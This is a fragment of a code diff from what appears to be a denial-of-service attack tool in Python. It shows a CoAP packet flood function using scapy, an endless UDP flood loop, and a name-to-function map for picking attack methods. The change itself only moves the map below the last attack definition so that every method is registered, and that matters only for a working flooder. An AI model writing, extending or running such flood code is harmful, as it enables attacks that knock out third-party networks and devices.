@@ -133,10 +133,7 @@ def coap_flood(ip, port=5683):
     token = os.urandom(4)
     coap = bytes([0x40 | msg_type, code]) + msg_id + token
     send(IP(dst=ip)/UDP(dport=port)/Raw(load=coap + os.urandom(12)), verbose=0)
-
-# Map method names to functions after definitions
-method_map = {name: globals()[name] for name in working_methods}
-
+    
 def five_udp_flood(ip, port=5357):
     while True:
         try:
@@ -146,6 +143,9 @@ def five_udp_flood(ip, port=5357):
             sock.close()
         except:
             pass
+
+# Map method names to functions after definitions
+method_map = {name: globals()[name] for name in working_methods}
 
 def runner_mode():
     cfg = json.load(open(CONFIG_FILE))
